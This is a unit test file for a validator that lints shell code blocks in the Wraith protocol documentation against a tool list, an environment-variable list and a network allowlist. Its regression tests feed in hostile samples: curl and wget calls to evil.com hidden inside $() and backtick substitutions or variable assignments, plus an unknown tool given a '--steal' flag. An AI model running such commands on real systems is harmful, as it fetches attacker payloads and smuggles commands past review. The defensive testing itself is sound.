/**
 * check-shell-commands.test.mjs
 *
 * Unit tests for the shell command validation logic in
 * scripts/check-shell-commands.mjs.
 *
 * Run:
 *   node --test scripts/check-shell-commands.test.mjs
 * or via the package.json script:
 *   pnpm run check:shell-commands
 */
import test from "node:test";
import assert from "node:assert/strict";
import {
  buildLogicalLines,
  splitCommandSegments,
  tokenise,
  validateFence,
  validateFlags,
  looksLikeLocalPath,
  extractCommandSubstitutions,
  validateCommandSubstitutions,
  KNOWN_TOOLS,
  KNOWN_ENV_VARS,
  NETWORK_ALLOWLIST,
} from "./check-shell-commands.mjs";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/**
 * buildLogicalLines produces a trailing "" for code ending with \n; filter
 * it out for cleaner assertions.
 */
function logicalLines(code) {
  return buildLogicalLines(code).filter((l) => l !== "");
}

/** Build a minimal fence object for validateFence. */
function fence(code, attrs = "") {
  return { file: "test.mdx", line: 1, lang: "bash", attrs, code };
}

// ---------------------------------------------------------------------------
// buildLogicalLines
// ---------------------------------------------------------------------------

test("buildLogicalLines: single line with no continuation", () => {
  assert.deepEqual(logicalLines("npm install foo\n"), ["npm install foo"]);
});

test("buildLogicalLines: joins backslash-continued lines into one", () => {
  const lines = logicalLines(
    "curl -X POST \\\n" +
    "  -H 'Content-Type: application/json' \\\n" +
    "  https://example.com\n",
  );
  assert.equal(lines.length, 1);
  assert.match(lines[0], /curl -X POST/);
  assert.match(lines[0], /https:\/\/example\.com/);
});

test("buildLogicalLines: joins multi-line single-quoted JSON body into one", () => {
  const lines = logicalLines(
    "curl -d '{\n" +
    '  "name": "alice"\n' +
    "}'\n",
  );
  assert.equal(lines.length, 1);
  assert.match(lines[0], /curl -d/);
  assert.match(lines[0], /alice/);
});

test("buildLogicalLines: joins multi-line double-quoted node -e script into one", () => {
  const lines = logicalLines(
    'node -e "\n' +
    "const x = 1;\n" +
    "console.log(x);\n" +
    '"\n',
  );
  assert.equal(lines.length, 1);
  assert.match(lines[0], /node -e/);
});

test("buildLogicalLines: two independent lines stay separate", () => {
  assert.deepEqual(logicalLines("cd /tmp\nls -la\n"), ["cd /tmp", "ls -la"]);
});

test("buildLogicalLines: blank lines are preserved (as empty strings)", () => {
  const result = buildLogicalLines("echo a\n\necho b\n");
  // blank line becomes ""
  assert.ok(result.includes("echo a"));
  assert.ok(result.includes("echo b"));
});

// ---------------------------------------------------------------------------
// tokenise
// ---------------------------------------------------------------------------

test("tokenise: splits on whitespace", () => {
  assert.deepEqual(tokenise("npm install foo bar"), ["npm", "install", "foo", "bar"]);
});

test("tokenise: respects single quotes — keeps content, drops quotes", () => {
  assert.deepEqual(tokenise("curl -d 'hello world'"), ["curl", "-d", "hello world"]);
});

test("tokenise: respects double quotes — keeps content, drops quotes", () => {
  assert.deepEqual(tokenise('echo "hello world"'), ["echo", "hello world"]);
});

test("tokenise: handles empty string", () => {
  assert.deepEqual(tokenise(""), []);
});

test("tokenise: preserves full Bearer token header value inside quotes", () => {
  const tokens = tokenise("curl -H 'Authorization: Bearer abc'");
  assert.equal(tokens[2], "Authorization: Bearer abc");
});

test("tokenise: adjacent combined short flag and value stays as one token", () => {
  const tokens = tokenise("curl -XPOSThttps://api.example.com");
  // "curl" is one token, "-XPOSThttps://api.example.com" is the second
  assert.equal(tokens.length, 2);
  assert.equal(tokens[1], "-XPOSThttps://api.example.com");
});

// ---------------------------------------------------------------------------
// validateFlags
// ---------------------------------------------------------------------------

test("validateFlags: accepts well-known curl flags -X and -H", () => {
  const errors = validateFlags(
    "curl",
    ["-X", "POST", "-H", "Content-Type: application/json"],
    "file.mdx:1",
    "curl -X POST -H ...",
  );
  assert.equal(errors.length, 0);
});

test("validateFlags: rejects unknown long flag for curl", () => {
  const errors = validateFlags("curl", ["--invented-flag"], "file.mdx:1", "curl --invented-flag");
  assert.equal(errors.length, 1);
  assert.match(errors[0], /unrecognised flag/);
  assert.match(errors[0], /--invented-flag/);
});

test("validateFlags: rejects unknown short flag for curl (-Z)", () => {
  const errors = validateFlags("curl", ["-Z"], "file.mdx:1", "curl -Z");
  assert.equal(errors.length, 1);
  assert.match(errors[0], /unrecognised short flag/);
  assert.match(errors[0], /-Z/);
});

test("validateFlags: wildcard tool (echo) accepts any argument", () => {
  const errors = validateFlags("echo", ["--anything", "-z", "foobar"], "file.mdx:1", "echo ...");
  assert.equal(errors.length, 0);
});

test("validateFlags: skips placeholder arguments like <PLACEHOLDER>", () => {
  const errors = validateFlags("curl", ["<PLACEHOLDER>"], "file.mdx:1", "curl <PLACEHOLDER>");
  assert.equal(errors.length, 0);
});

test("validateFlags: skips shell variable expansions like $MY_VAR", () => {
  const errors = validateFlags("curl", ["$MY_VAR"], "file.mdx:1", "curl $MY_VAR");
  assert.equal(errors.length, 0);
});

test("validateFlags: accepts npm install subcommand", () => {
  const errors = validateFlags(
    "npm",
    ["install", "@wraith-protocol/sdk"],
    "file.mdx:1",
    "npm install @wraith-protocol/sdk",
  );
  assert.equal(errors.length, 0);
});

test("validateFlags: accepts cargo build --target --release", () => {
  const errors = validateFlags(
    "cargo",
    ["build", "--target", "riscv64imac-unknown-none-elf", "--release"],
    "file.mdx:1",
    "cargo build --target ...",
  );
  assert.equal(errors.length, 0);
});

test("validateFlags: accepts curl --silent --location --output", () => {
  const errors = validateFlags(
    "curl",
    ["--silent", "--location", "--output", "file.bin"],
    "file.mdx:1",
    "curl --silent ...",
  );
  assert.equal(errors.length, 0);
});

// ---------------------------------------------------------------------------
// looksLikeLocalPath
// ---------------------------------------------------------------------------

test("looksLikeLocalPath: recognises shipped guide path", () => {
  assert.equal(looksLikeLocalPath("guides/ops/alerts/wraith-alerts.yml"), true);
});

test("looksLikeLocalPath: recognises scripts/ path", () => {
  assert.equal(looksLikeLocalPath("scripts/check-shell-commands.mjs"), true);
});

test("looksLikeLocalPath: recognises reference/ path", () => {
  assert.equal(looksLikeLocalPath("reference/contract-registry.mdx"), true);
});

test("looksLikeLocalPath: rejects flag arguments", () => {
  assert.equal(looksLikeLocalPath("--output"), false);
  assert.equal(looksLikeLocalPath("-f"), false);
});

test("looksLikeLocalPath: rejects HTTP URLs", () => {
  assert.equal(looksLikeLocalPath("https://example.com/foo.json"), false);
});

test("looksLikeLocalPath: rejects variable expansions", () => {
  assert.equal(looksLikeLocalPath("$MY_VAR"), false);
});

test("looksLikeLocalPath: rejects placeholder tokens", () => {
  assert.equal(looksLikeLocalPath("<PLACEHOLDER>"), false);
});

test("looksLikeLocalPath: rejects npm scoped packages", () => {
  assert.equal(looksLikeLocalPath("@wraith-protocol/sdk"), false);
});

test("looksLikeLocalPath: rejects bare filenames without shipped prefix (cross-repo)", () => {
  assert.equal(looksLikeLocalPath("submit.js"), false);
  assert.equal(looksLikeLocalPath("sign.js"), false);
  assert.equal(looksLikeLocalPath("deployment.toml"), false);
});

test("looksLikeLocalPath: rejects contracts/ path (separate repo)", () => {
  // contracts/ is intentionally excluded from the shipped dir prefixes
  assert.equal(looksLikeLocalPath("contracts/stellar/stealth-announcer"), false);
});

// ---------------------------------------------------------------------------
// validateFence — full fence integration
// ---------------------------------------------------------------------------

test("validateFence: clean npm install passes", () => {
  assert.equal(validateFence(fence("npm install @wraith-protocol/sdk\n")).length, 0);
});

test("validateFence: no-check attr — validateFence still runs (guard is in main); caller must skip", () => {
  // validateFence itself does not inspect attrs — the caller (main) filters by attrs.
  // A fence with a known-bad executable will still error even with no-check attr on the
  // fence object, because validateFence is the inner pure function.
  // The test confirms this contract so callers don't rely on validateFence for the guard.
  const errors = validateFence(fence("totally-unknown-tool --flag\n", "no-check"));
  // validateFence reports the error; filtering is the caller's responsibility.
  assert.equal(errors.length, 1);
  assert.match(errors[0], /unknown executable/);
});

test("validateFence: skips comment-only lines (#)", () => {
  assert.equal(
    validateFence(fence("# This is a comment\nnpm install foo\n")).length,
    0,
  );
});

test("validateFence: skips per-line no-check annotation", () => {
  assert.equal(
    validateFence(fence("UNKNOWN_BINARY --foo # no-check\nnpm install foo\n")).length,
    0,
  );
});

test("validateFence: rejects unknown executable", () => {
  const errors = validateFence(fence("totally-unknown-tool --flag\n"));
  assert.equal(errors.length, 1);
  assert.match(errors[0], /unknown executable/);
  assert.match(errors[0], /totally-unknown-tool/);
});

test("validateFence: rejects undocumented env var", () => {
  const errors = validateFence(fence("UNDOCUMENTED_VAR=some_value\n"));
  assert.equal(errors.length, 1);
  assert.match(errors[0], /undocumented environment variable/);
  assert.match(errors[0], /UNDOCUMENTED_VAR/);
});

test("validateFence: accepts documented env var STELLAR_NETWORK", () => {
  assert.equal(validateFence(fence("STELLAR_NETWORK=testnet\n")).length, 0);
});

test("validateFence: accepts documented env var with URL value", () => {
  assert.equal(
    validateFence(fence("STELLAR_RPC_URL=https://soroban-testnet.stellar.org\n")).length,
    0,
  );
});

test("validateFence: multi-line curl JSON body treated as one logical line", () => {
  const code =
    "curl -X POST https://api.usewraith.xyz/agent/create \\\n" +
    '  -H "Authorization: Bearer $WRAITH_API_KEY" \\\n' +
    '  -H "Content-Type: application/json" \\\n' +
    "  -d '{\n" +
    '    "name": "payments",\n' +
    '    "chain": "stellar"\n' +
    "  }'\n";
  assert.equal(validateFence(fence(code)).length, 0);
});

test("validateFence: rejects curl to arbitrary domain", () => {
  const errors = validateFence(fence("curl https://evil.com/payload\n"));
  assert.equal(errors.length, 1);
  assert.match(errors[0], /not in allowlist/);
});

test("validateFence: accepts Wraith API curl endpoint", () => {
  const code =
    "curl -X POST https://api.usewraith.xyz/agent/create \\\n" +
    '  -H "Authorization: Bearer $WRAITH_API_KEY"\n';
  assert.equal(validateFence(fence(code)).length, 0);
});

test("validateFence: accepts friendbot testnet curl", () => {
  assert.equal(
    validateFence(fence('curl "https://friendbot.stellar.org?addr=GABC...YOURADDRESS"\n')).length,
    0,
  );
});

test("validateFence: accepts promtool check rules with existing path", () => {
  assert.equal(
    validateFence(fence("promtool check rules guides/ops/alerts/wraith-alerts.yml\n")).length,
    0,
  );
});

test("validateFence: accepts sha256sum with non-path argument", () => {
  assert.equal(
    validateFence(
      fence("sha256sum target/wasm32-unknown-unknown/release/stealth_announcer.wasm\n"),
    ).length,
    0,
  );
});

test("validateFence: accepts SIGNED_XDR (documented variable)", () => {
  // SIGNED_XDR is in KNOWN_ENV_VARS; assignment should pass.
  assert.equal(validateFence(fence("SIGNED_XDR=$(node sign.js foo)\n")).length, 0);
});

test("validateFence: accepts multiple documented env vars", () => {
  const code =
    "STELLAR_NETWORK=testnet\n" +
    'STELLAR_NETWORK_PASSPHRASE="Test SDF Network ; September 2015"\n' +
    "STELLAR_HORIZON_URL=https://horizon-testnet.stellar.org\n" +
    "STELLAR_RPC_URL=https://soroban-testnet.stellar.org\n";
  assert.equal(validateFence(fence(code)).length, 0);
});

test("validateFence: accepts rustup target add", () => {
  assert.equal(
    validateFence(fence("rustup target add wasm32-unknown-unknown\n")).length,
    0,
  );
});

test("validateFence: accepts stellar account fund (deployment docs)", () => {
  assert.equal(
    validateFence(fence("stellar account fund <DEPLOYER_ADDRESS> --network mainnet\n")).length,
    0,
  );
});

test("validateFence: accepts git clone from wraith-protocol org", () => {
  assert.equal(
    validateFence(fence("git clone https://github.com/wraith-protocol/contracts.git\n")).length,
    0,
  );
});

// ---------------------------------------------------------------------------
// KNOWN_TOOLS completeness spot-checks
// ---------------------------------------------------------------------------

test("KNOWN_TOOLS includes all CLI tools used in the docs", () => {
  const required = [
    "stellar", "soroban", "anchor", "cargo", "rustup",
    "ckb-cli", "phala", "promtool", "zbarcam",
    "npm", "npx", "pnpm", "node", "pip",
    "curl", "git", "docker",
  ];
  for (const tool of required) {
    assert.ok(KNOWN_TOOLS.has(tool), `KNOWN_TOOLS is missing '${tool}'`);
  }
});

// ---------------------------------------------------------------------------
// KNOWN_ENV_VARS completeness spot-checks
// ---------------------------------------------------------------------------

test("KNOWN_ENV_VARS includes core Stellar vars", () => {
  for (const v of [
    "STELLAR_NETWORK", "STELLAR_RPC_URL", "STELLAR_HORIZON_URL",
    "STELLAR_NETWORK_PASSPHRASE", "STELLAR_ANNOUNCER_CONTRACT_ID",
    "STELLAR_NAMES_CONTRACT_ID", "WRAITH_API_KEY", "AGENT_ID",
  ]) {
    assert.ok(KNOWN_ENV_VARS.has(v), `KNOWN_ENV_VARS is missing '${v}'`);
  }
});

test("KNOWN_ENV_VARS includes SIGNED_XDR and sponsor/sender secrets", () => {
  assert.ok(KNOWN_ENV_VARS.has("SIGNED_XDR"));
  assert.ok(KNOWN_ENV_VARS.has("SPONSOR_SECRET"));
  assert.ok(KNOWN_ENV_VARS.has("SENDER_SECRET"));
});

// ---------------------------------------------------------------------------
// NETWORK_ALLOWLIST pattern spot-checks
// ---------------------------------------------------------------------------

test("NETWORK_ALLOWLIST allows Wraith API POST endpoint", () => {
  assert.ok(
    NETWORK_ALLOWLIST.some((re) =>
      re.test("curl -X POST https://api.usewraith.xyz/agent/create"),
    ),
  );
});

test("NETWORK_ALLOWLIST allows Wraith API GET endpoint", () => {
  assert.ok(
    NETWORK_ALLOWLIST.some((re) =>
      re.test("curl https://api.usewraith.xyz/agent/info/payments"),
    ),
  );
});

test("NETWORK_ALLOWLIST allows friendbot testnet", () => {
  assert.ok(
    NETWORK_ALLOWLIST.some((re) =>
      re.test('curl "https://friendbot.stellar.org?addr=GABC...YOURADDRESS"'),
    ),
  );
});

test("NETWORK_ALLOWLIST allows friendbot futurenet", () => {
  assert.ok(
    NETWORK_ALLOWLIST.some((re) =>
      re.test('curl "https://friendbot-futurenet.stellar.org/?addr=GTEST"'),
    ),
  );
});

test("NETWORK_ALLOWLIST does NOT allow curl to arbitrary domain", () => {
  assert.equal(
    NETWORK_ALLOWLIST.some((re) => re.test("curl https://evil.com/payload")),
    false,
  );
});

test("NETWORK_ALLOWLIST allows git clone from wraith-protocol org", () => {
  assert.ok(
    NETWORK_ALLOWLIST.some((re) =>
      re.test("git clone https://github.com/wraith-protocol/contracts.git"),
    ),
  );
});

test("NETWORK_ALLOWLIST does NOT allow git clone from arbitrary org", () => {
  assert.equal(
    NETWORK_ALLOWLIST.some((re) =>
      re.test("git clone https://github.com/someoneelse/malicious.git"),
    ),
    false,
  );
});

test("NETWORK_ALLOWLIST allows stellar account fund", () => {
  assert.ok(
    NETWORK_ALLOWLIST.some((re) =>
      re.test("stellar account fund <DEPLOYER_ADDRESS> --network mainnet"),
    ),
  );
});

test("NETWORK_ALLOWLIST allows soroban contract invoke", () => {
  assert.ok(
    NETWORK_ALLOWLIST.some((re) =>
      re.test("soroban contract invoke --id <ID> --network testnet -- init"),
    ),
  );
});

test("NETWORK_ALLOWLIST allows npm install", () => {
  assert.ok(
    NETWORK_ALLOWLIST.some((re) => re.test("npm install @wraith-protocol/sdk")),
  );
});

test("NETWORK_ALLOWLIST allows npm run", () => {
  assert.ok(
    NETWORK_ALLOWLIST.some((re) => re.test("npm run check:compatibility-matrix")),
  );
});

// ---------------------------------------------------------------------------
// splitCommandSegments — unit tests
// ---------------------------------------------------------------------------

test("splitCommandSegments: single command returns one segment", () => {
  assert.deepEqual(splitCommandSegments("echo ok"), ["echo ok"]);
});

test("splitCommandSegments: splits on semicolon", () => {
  assert.deepEqual(
    splitCommandSegments("echo ok; echo two"),
    ["echo ok", "echo two"],
  );
});

test("splitCommandSegments: splits on &&", () => {
  assert.deepEqual(
    splitCommandSegments("npm install foo && echo done"),
    ["npm install foo", "echo done"],
  );
});

test("splitCommandSegments: splits on ||", () => {
  assert.deepEqual(
    splitCommandSegments("npm install foo || echo failed"),
    ["npm install foo", "echo failed"],
  );
});

test("splitCommandSegments: splits on pipe |", () => {
  assert.deepEqual(
    splitCommandSegments("echo foo | grep foo"),
    ["echo foo", "grep foo"],
  );
});

test("splitCommandSegments: semicolon inside single quotes is NOT a separator", () => {
  assert.deepEqual(
    splitCommandSegments("echo 'a; b'"),
    ["echo 'a; b'"],
  );
});

test("splitCommandSegments: pipe inside double quotes is NOT a separator", () => {
  assert.deepEqual(
    splitCommandSegments('echo "a | b"'),
    ['echo "a | b"'],
  );
});

test("splitCommandSegments: multiple operators produce multiple segments", () => {
  const result = splitCommandSegments("echo a; echo b && echo c");
  assert.equal(result.length, 3);
  assert.equal(result[0], "echo a");
  assert.equal(result[1], "echo b");
  assert.equal(result[2], "echo c");
});

// ---------------------------------------------------------------------------
// validateFence — semicolon regression tests
// ---------------------------------------------------------------------------

test("validateFence: rejects unknown tool after semicolon", () => {
  const errors = validateFence(fence("echo ok; totally-unknown-tool arg\n"));
  assert.equal(errors.length, 1);
  assert.match(errors[0], /unknown executable/);
  assert.match(errors[0], /totally-unknown-tool/);
});

test("validateFence: rejects unknown tool after && operator", () => {
  const errors = validateFence(fence("npm install foo && totally-unknown-tool arg\n"));
  assert.equal(errors.length, 1);
  assert.match(errors[0], /unknown executable/);
  assert.match(errors[0], /totally-unknown-tool/);
});

test("validateFence: rejects unknown tool piped after allowlisted curl", () => {
  const errors = validateFence(
    fence("curl https://api.usewraith.xyz/agent/info/x | totally-unknown-tool\n"),
  );
  assert.equal(errors.length, 1);
  assert.match(errors[0], /unknown executable/);
  assert.match(errors[0], /totally-unknown-tool/);
});

test("validateFence: accepts known tools on both sides of a pipe", () => {
  const errors = validateFence(fence("echo hello | grep hello\n"));
  assert.equal(errors.length, 0);
});

test("validateFence: accepts known tools on both sides of &&", () => {
  const errors = validateFence(fence("mkdir -p /tmp/foo && cd /tmp/foo\n"));
  assert.equal(errors.length, 0);
});

test("validateFence: accepts known tools on both sides of semicolon", () => {
  const errors = validateFence(fence("echo a; echo b\n"));
  assert.equal(errors.length, 0);
});

// ---------------------------------------------------------------------------
// validateFence — env-var prefix (assignment-prefixed command) regression tests
// ---------------------------------------------------------------------------

test("validateFence: rejects unknown tool after env var assignment prefix", () => {
  const errors = validateFence(fence("STELLAR_NETWORK=testnet totally-unknown-tool arg\n"));
  assert.equal(errors.length, 1);
  assert.match(errors[0], /unknown executable/);
  assert.match(errors[0], /totally-unknown-tool/);
});

test("validateFence: validates known tool after documented env var prefix", () => {
  // soroban is a wildcard tool (no flag errors expected), STELLAR_NETWORK is documented
  const errors = validateFence(
    fence("STELLAR_NETWORK=testnet soroban contract build\n"),
  );
  assert.equal(errors.length, 0);
});

test("validateFence: rejects undocumented env var even when followed by known tool", () => {
  const errors = validateFence(fence("UNDOC_VAR=foo echo hello\n"));
  // UNDOC_VAR should be flagged as undocumented; echo is known so no exe error
  assert.ok(errors.some((e) => /undocumented environment variable/.test(e) && /UNDOC_VAR/.test(e)));
  assert.equal(errors.filter((e) => /unknown executable/.test(e)).length, 0);
});

test("validateFence: rejects undocumented env var and unknown tool in same prefix-command", () => {
  const errors = validateFence(fence("UNDOC_VAR=foo totally-unknown-tool arg\n"));
  assert.ok(errors.some((e) => /undocumented environment variable/.test(e)));
  assert.ok(errors.some((e) => /unknown executable/.test(e) && /totally-unknown-tool/.test(e)));
});

test("validateFence: pure env-var assignment (no command) still passes for documented vars", () => {
  const errors = validateFence(fence("STELLAR_NETWORK=testnet\n"));
  assert.equal(errors.length, 0);
});

test("validateFence: pure env-var assignment (no command) still rejects undocumented vars", () => {
  const errors = validateFence(fence("UNDOCUMENTED_VAR=some_value\n"));
  assert.equal(errors.length, 1);
  assert.match(errors[0], /undocumented environment variable/);
});

// ---------------------------------------------------------------------------
// validateFence — compound operator + env prefix combined
// ---------------------------------------------------------------------------

test("validateFence: semicolon with env-var prefix on second segment is validated", () => {
  // First segment is clean; second has an unknown tool after an env prefix.
  const errors = validateFence(
    fence("echo start; STELLAR_NETWORK=testnet totally-unknown-tool\n"),
  );
  assert.equal(errors.length, 1);
  assert.match(errors[0], /unknown executable/);
  assert.match(errors[0], /totally-unknown-tool/);
});

// ---------------------------------------------------------------------------
// extractCommandSubstitutions — unit tests
// ---------------------------------------------------------------------------

test("extractCommandSubstitutions: returns empty array for plain text", () => {
  assert.deepEqual(extractCommandSubstitutions("echo hello"), []);
});

test("extractCommandSubstitutions: extracts single $(...) body", () => {
  const bodies = extractCommandSubstitutions("$(totally-unknown-tool --steal)");
  assert.ok(bodies.includes("totally-unknown-tool --steal"));
});

test("extractCommandSubstitutions: extracts single backtick body", () => {
  const bodies = extractCommandSubstitutions("`totally-unknown-tool --steal`");
  assert.ok(bodies.includes("totally-unknown-tool --steal"));
});

test("extractCommandSubstitutions: extracts $(...) embedded in a larger string", () => {
  const bodies = extractCommandSubstitutions("echo $(date) world");
  assert.ok(bodies.includes("date"));
});

test("extractCommandSubstitutions: extracts multiple substitutions", () => {
  const bodies = extractCommandSubstitutions("$(foo) bar $(baz)");
  assert.ok(bodies.includes("foo"));
  assert.ok(bodies.includes("baz"));
});

test("extractCommandSubstitutions: handles nested $(...) — outer and inner both returned", () => {
  const bodies = extractCommandSubstitutions("$(echo $(date))");
  // outer body is "echo $(date)", inner body is "date"
  assert.ok(bodies.some((b) => b.includes("echo")));
  assert.ok(bodies.some((b) => b.trim() === "date"));
});

test("extractCommandSubstitutions: handles backtick with escape", () => {
  const bodies = extractCommandSubstitutions("`echo \\`inner\\``");
  // outer backtick body should be non-empty
  assert.ok(bodies.length >= 1);
});

// ---------------------------------------------------------------------------
// validateCommandSubstitutions — unit tests
// ---------------------------------------------------------------------------

test("validateCommandSubstitutions: no error for known tool inside $()", () => {
  const errors = [];
  validateCommandSubstitutions("$(node sign.js)", "file.mdx:1", errors);
  assert.equal(errors.length, 0);
});

test("validateCommandSubstitutions: reports error for unknown tool inside $()", () => {
  const errors = [];
  validateCommandSubstitutions("$(totally-unknown-tool --steal)", "file.mdx:1", errors);
  assert.equal(errors.length, 1);
  assert.match(errors[0], /unknown executable/);
  assert.match(errors[0], /totally-unknown-tool/);
  assert.match(errors[0], /command substitution/);
});

test("validateCommandSubstitutions: reports error for unknown tool inside backticks", () => {
  const errors = [];
  validateCommandSubstitutions("`totally-unknown-tool --steal`", "file.mdx:1", errors);
  assert.equal(errors.length, 1);
  assert.match(errors[0], /unknown executable/);
  assert.match(errors[0], /totally-unknown-tool/);
});

test("validateCommandSubstitutions: no error when no substitution present", () => {
  const errors = [];
  validateCommandSubstitutions("just plain text", "file.mdx:1", errors);
  assert.equal(errors.length, 0);
});

test("validateCommandSubstitutions: catches unknown tool in nested substitution", () => {
  const errors = [];
  validateCommandSubstitutions("$(echo $(totally-unknown-tool))", "file.mdx:1", errors);
  assert.ok(errors.some((e) => /totally-unknown-tool/.test(e)));
});

// ---------------------------------------------------------------------------
// validateFence — command substitution regression tests (assignment position)
// ---------------------------------------------------------------------------

test("validateFence: rejects unknown tool in $() assignment value — regression", () => {
  // This was previously silently accepted; the inner command must be validated.
  const errors = validateFence(fence("SIGNED_XDR=$(totally-unknown-tool --steal)\n"));
  assert.equal(errors.length, 1);
  assert.match(errors[0], /unknown executable/);
  assert.match(errors[0], /totally-unknown-tool/);
});

test("validateFence: rejects unknown tool in backtick assignment value — regression", () => {
  const errors = validateFence(fence("SIGNED_XDR=`totally-unknown-tool --steal`\n"));
  assert.equal(errors.length, 1);
  assert.match(errors[0], /unknown executable/);
  assert.match(errors[0], /totally-unknown-tool/);
});

test("validateFence: accepts known tool in $() assignment value", () => {
  // node is in KNOWN_TOOLS; this must continue to pass after the fix.
  const errors = validateFence(fence("SIGNED_XDR=$(node sign.js foo)\n"));
  assert.equal(errors.length, 0);
});

test("validateFence: accepts known tool in backtick assignment value", () => {
  const errors = validateFence(fence("SIGNED_XDR=`node sign.js foo`\n"));
  assert.equal(errors.length, 0);
});

test("validateFence: rejects unknown tool in $() inside undocumented var assignment", () => {
  // Both the undocumented var and the unknown inner tool must be reported.
  const errors = validateFence(fence("UNDOC_VAR=$(totally-unknown-tool --steal)\n"));
  assert.ok(errors.some((e) => /undocumented environment variable/.test(e)));
  assert.ok(errors.some((e) => /unknown executable/.test(e) && /totally-unknown-tool/.test(e)));
});

// ---------------------------------------------------------------------------
// validateFence — command substitution regression tests (argument position)
// ---------------------------------------------------------------------------

test("validateFence: rejects unknown tool in $() argument position — regression", () => {
  // echo $(totally-unknown-tool --steal) was previously silently accepted.
  const errors = validateFence(fence("echo $(totally-unknown-tool --steal)\n"));
  assert.equal(errors.length, 1);
  assert.match(errors[0], /unknown executable/);
  assert.match(errors[0], /totally-unknown-tool/);
});

test("validateFence: rejects unknown tool in backtick argument position — regression", () => {
  const errors = validateFence(fence("echo `totally-unknown-tool --steal`\n"));
  assert.equal(errors.length, 1);
  assert.match(errors[0], /unknown executable/);
  assert.match(errors[0], /totally-unknown-tool/);
});

test("validateFence: accepts known tool in $() argument position", () => {
  // stellar keys address is allowlisted, and the outer echo is known.
  const errors = validateFence(
    fence("echo $(stellar keys address my-key)\n"),
  );
  assert.equal(errors.length, 0);
});

test("validateFence: rejects unknown tool in nested command substitution", () => {
  const errors = validateFence(fence("echo $(echo $(totally-unknown-tool))\n"));
  assert.ok(errors.some((e) => /totally-unknown-tool/.test(e)));
});

test("validateFence: rejects unknown tool in $() after compound operator", () => {
  // The substitution is in the second segment of a semicolon-separated line.
  const errors = validateFence(
    fence("npm install foo; echo $(totally-unknown-tool --steal)\n"),
  );
  assert.equal(errors.length, 1);
  assert.match(errors[0], /unknown executable/);
  assert.match(errors[0], /totally-unknown-tool/);
});

test("validateFence: multiple clean known-tool substitutions pass", () => {
  // Both node and echo are in KNOWN_TOOLS; neither substitution should error.
  const errors = validateFence(fence("echo $(node --version) $(echo ok)\n"));
  assert.equal(errors.length, 0);
});

// ---------------------------------------------------------------------------
// Network-allowlist bypass regression tests (commit 03715a3 gap)
//
// Previously validateCommandSubstitutions only checked whether the executable
// name was in KNOWN_TOOLS.  That meant curl/wget to arbitrary domains inside
// $(...) or `...` were silently accepted because "curl" is a known tool.
// The tests below are the specific cases the maintainer reported.
// ---------------------------------------------------------------------------

test("validateFence: rejects curl to arbitrary domain inside $() — argument position", () => {
  // echo $(curl https://evil.com/payload) must be caught.
  const errors = validateFence(fence("echo $(curl https://evil.com/payload)\n"));
  assert.equal(errors.length, 1);
  assert.match(errors[0], /not in allowlist/);
  assert.match(errors[0], /evil\.com/);
});

test("validateFence: rejects curl to arbitrary domain inside backtick — argument position", () => {
  // echo `curl https://evil.com/payload` must be caught.
  const errors = validateFence(fence("echo `curl https://evil.com/payload`\n"));
  assert.equal(errors.length, 1);
  assert.match(errors[0], /not in allowlist/);
  assert.match(errors[0], /evil\.com/);
});

test("validateFence: rejects curl to arbitrary domain inside $() assignment — SIGNED_XDR", () => {
  // SIGNED_XDR=$(curl https://evil.com/payload) must be caught.
  const errors = validateFence(fence("SIGNED_XDR=$(curl https://evil.com/payload)\n"));
  assert.equal(errors.length, 1);
  assert.match(errors[0], /not in allowlist/);
  assert.match(errors[0], /evil\.com/);
});

test("validateFence: rejects curl to arbitrary domain inside backtick assignment — SIGNED_XDR", () => {
  // SIGNED_XDR=`curl https://evil.com/payload` must be caught.
  const errors = validateFence(fence("SIGNED_XDR=`curl https://evil.com/payload`\n"));
  assert.equal(errors.length, 1);
  assert.match(errors[0], /not in allowlist/);
  assert.match(errors[0], /evil\.com/);
});

test("validateFence: rejects wget to arbitrary domain inside $()", () => {
  const errors = validateFence(fence("echo $(wget https://evil.com/payload)\n"));
  assert.equal(errors.length, 1);
  assert.match(errors[0], /not in allowlist/);
  assert.match(errors[0], /evil\.com/);
});

test("validateFence: rejects wget to arbitrary domain inside backticks", () => {
  const errors = validateFence(fence("echo `wget https://evil.com/payload`\n"));
  assert.equal(errors.length, 1);
  assert.match(errors[0], /not in allowlist/);
  assert.match(errors[0], /evil\.com/);
});

test("validateFence: rejects compound command inside $() — unknown tool after pipe", () => {
  // $(echo foo | totally-unknown-tool) — the second segment must be validated.
  const errors = validateFence(fence("echo $(echo foo | totally-unknown-tool)\n"));
  assert.ok(errors.some((e) => /unknown executable/.test(e) && /totally-unknown-tool/.test(e)));
});

test("validateFence: rejects compound command inside backticks — unknown tool after semicolon", () => {
  // `echo foo; totally-unknown-tool` — the second segment must be validated.
  const errors = validateFence(fence("echo `echo foo; totally-unknown-tool`\n"));
  assert.ok(errors.some((e) => /unknown executable/.test(e) && /totally-unknown-tool/.test(e)));
});

test("validateFence: rejects curl to arbitrary domain inside compound $() after &&", () => {
  // git clone ... && echo $(curl https://evil.com/payload)
  const errors = validateFence(
    fence(
      "git clone https://github.com/wraith-protocol/contracts.git && " +
      "echo $(curl https://evil.com/payload)\n",
    ),
  );
  assert.ok(errors.some((e) => /not in allowlist/.test(e) && /evil\.com/.test(e)));
});

// Ensure allowlisted substitutions still pass after the fix.

test("validateFence: allowlisted curl inside $() still passes — friendbot addr subshell", () => {
  // The existing friendbot-via-subshell pattern in NETWORK_ALLOWLIST.
  const code =
    'curl "https://friendbot.stellar.org/?addr=$(stellar keys address my-key)"\n';
  assert.equal(validateFence(fence(code)).length, 0);
});

test("validateFence: allowlisted curl inside $() still passes — Wraith API endpoint", () => {
  // Wraith API is in NETWORK_ALLOWLIST; nesting it inside a documented-var
  // substitution must stay valid. SIGNED_XDR is in KNOWN_ENV_VARS.
  const errors = validateFence(
    fence("SIGNED_XDR=$(curl https://api.usewraith.xyz/agent/info/payments)\n"),
  );
  assert.equal(errors.length, 0);
});

test("validateCommandSubstitutions: rejects curl to arbitrary domain inside $() directly", () => {
  const errors = [];
  validateCommandSubstitutions("$(curl https://evil.com/payload)", "file.mdx:1", errors);
  assert.equal(errors.length, 1);
  assert.match(errors[0], /not in allowlist/);
  assert.match(errors[0], /evil\.com/);
});

test("validateCommandSubstitutions: rejects curl to arbitrary domain inside backtick directly", () => {
  const errors = [];
  validateCommandSubstitutions("`curl https://evil.com/payload`", "file.mdx:1", errors);
  assert.equal(errors.length, 1);
  assert.match(errors[0], /not in allowlist/);
